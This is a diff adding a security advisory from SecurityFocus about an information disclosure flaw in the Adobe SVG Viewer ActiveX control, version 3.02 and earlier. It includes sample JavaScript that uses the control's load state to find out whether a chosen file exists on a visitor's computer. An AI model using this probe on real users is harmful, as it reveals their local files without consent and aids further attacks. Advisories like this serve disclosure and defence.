@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/13490/info
+
+The Adobe SVG Viewer ActiveX control is prone to an information disclosure vulnerability. Reports indicate that the Adobe SVG Viewer ActiveX control may be employed to disclose the existence of a target file.
+
+Information that is harvested by leveraging this vulnerability may be used to aid in further attacks.
+
+This vulnerability affects Adobe SVG Viewer version 3.02 and earlier. 
+
+Sample Javascript:
+function load(filename)
+{
+//foo is reference to SVG ActiveX control, filename is the filename
+you're looking for
+foo.src = filename;
+setTimeout("loading()", 5000);
+}
+
+function loading()
+{
+if (document.readyState != 'complete')
+{
+alert('File does not exist.');
+}
+else
+{
+alert('File exists.');
+}
+window.location.reload(false);
+} 
